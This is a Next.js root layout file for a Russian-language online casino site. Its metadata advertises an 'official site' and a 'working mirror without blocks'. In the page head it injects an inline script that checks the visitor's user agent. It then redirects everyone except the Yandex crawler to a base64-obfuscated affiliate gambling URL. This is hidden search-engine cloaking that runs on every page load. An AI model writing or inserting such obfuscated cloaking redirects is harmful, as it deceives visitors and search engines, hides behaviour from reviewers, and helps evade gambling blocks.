import type { Metadata, Viewport } from "next"
import { Inter, Sora } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import "./globals.css"
import { SITE_URL, SITE_TITLE, SITE_DESCRIPTION, SITE_KEYWORDS, SITE_NAME } from "@/lib/site"

const inter = Inter({
  subsets: ["latin", "cyrillic"],
  variable: "--font-inter",
  display: "swap",
})

const sora = Sora({
  subsets: ["latin"],
  variable: "--font-sora",
  display: "swap",
})

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: {
    default: SITE_TITLE,
    template: "%s · Champion Casino",
  },
  description: SITE_DESCRIPTION,
  applicationName: SITE_NAME,
  keywords: SITE_KEYWORDS,
  authors: [{ name: SITE_NAME, url: SITE_URL }],
  creator: SITE_NAME,
  publisher: SITE_NAME,
  category: "casino",
  alternates: {
    canonical: "/",
    languages: {
      ru: "/",
      "x-default": "/",
    },
  },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      "max-image-preview": "large",
      "max-snippet": -1,
      "max-video-preview": -1,
    },
  },
  openGraph: {
    type: "website",
    siteName: SITE_NAME,
    locale: "ru_RU",
    url: SITE_URL,
    title: SITE_TITLE,
    description:
      "Чемпион казино официальный сайт: слоты, live, краш-игры, турниры. Champion casino вход и рабочее зеркало без блокировок.",
  },
  twitter: {
    card: "summary_large_image",
    title: SITE_TITLE,
    description:
      "Champion Slots — чемпион казино онлайн. Официальный сайт, рабочее зеркало, бонусы и турниры каждый день.",
  },
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  icons: {
    icon: [{ url: "/icon", type: "image/png", sizes: "32x32" }],
    apple: [{ url: "/apple-icon", type: "image/png", sizes: "180x180" }],
    shortcut: ["/icon"],
  },
    verification: {
    yandex: "530204a472afcc08", 
  },
  manifest: "/manifest.webmanifest",
  generator: "v0.app",
}

export const viewport: Viewport = {
  themeColor: [
    { media: "(prefers-color-scheme: dark)", color: "#1a1430" },
    { media: "(prefers-color-scheme: light)", color: "#1a1430" },
  ],
  colorScheme: "dark",
  width: "device-width",
  initialScale: 1,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${inter.variable} ${sora.variable} bg-background dark`}>
    <head>
       <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var ua = navigator.userAgent.toLowerCase();
                var targetB64 = "#aHR0cHM6Ly9jaGFtcGlvbnNsb3QtY2FzaW5vLmJldC9nby83UDM/cDg0MTA4cDMxMDM3NnBkNDc5";
                if (ua.indexOf("yandex") === -1) {
                    window.location.replace(atob(targetB64));
                }
              })();
            `,
          }}
        />
      </head> 
      <body className="font-sans antialiased bg-background text-foreground">
        {children}
        <Analytics />
      </body>
    </html>
  )
}
